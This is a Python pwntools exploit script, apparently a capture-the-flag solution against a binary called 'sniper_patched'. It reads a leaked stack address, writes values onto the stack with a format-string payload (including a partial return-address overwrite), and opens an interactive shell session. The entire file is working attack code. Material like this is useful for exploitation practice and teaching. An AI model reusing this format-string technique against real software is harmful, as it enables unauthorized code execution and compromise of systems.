#!/usr/bin/env python3
import time

from pwn import *

exe = ELF("./sniper_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.28.so")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("addr", 1337)

    return r


def main():
    r = conn()
   
    offset = 6
    # r.recvuntil(b"")
    leak_stack = int(r.recvline().strip().decode(),16)
    log.info(f"Leak stack {hex(leak_stack + 64)}")
    value = leak_stack - 64
    ret = leak_stack - 79
    payload = fmtstr_payload(offset,{value: 0x000000000a0a0000,ret: 0xd1}, write_size='short')
    print(hex(exe.sym['main']))
    print(hex(exe.got['exit']))
    print(len(payload))
    time.sleep(10)
    # print(r.recv(1))
    r.sendline(payload)

    r.interactive()


if __name__ == "__main__":
    main()
